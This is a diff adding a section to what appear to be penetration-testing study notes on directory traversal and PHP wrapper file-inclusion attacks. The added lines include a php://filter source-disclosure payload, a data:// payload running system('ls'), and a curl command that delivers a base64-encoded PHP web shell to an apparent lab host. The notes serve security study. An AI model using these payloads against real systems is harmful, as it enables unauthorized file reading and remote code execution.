@@ -12,6 +12,27 @@ using it to run a file which had no perms for user:
 - ./chmodnew +x no_permissions.py
 
 
+Directory Traversal:
+on windows check the:  C:\Windows\System32\drivers\etc\hosts
+
+PHP Wrappers:
+php://filter  = displays
+
+example: we find a page called admin.php
+page=php://filter/convert.base64-encode/resource=admin.php
+
+php://data = executes
+
+example:
+page=data://text/plain,<?php%20echo%20system('ls');?>"
+
+you can even url encode this (or base64)
+curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
+
+
+
+
+
 
 
 ----------------------
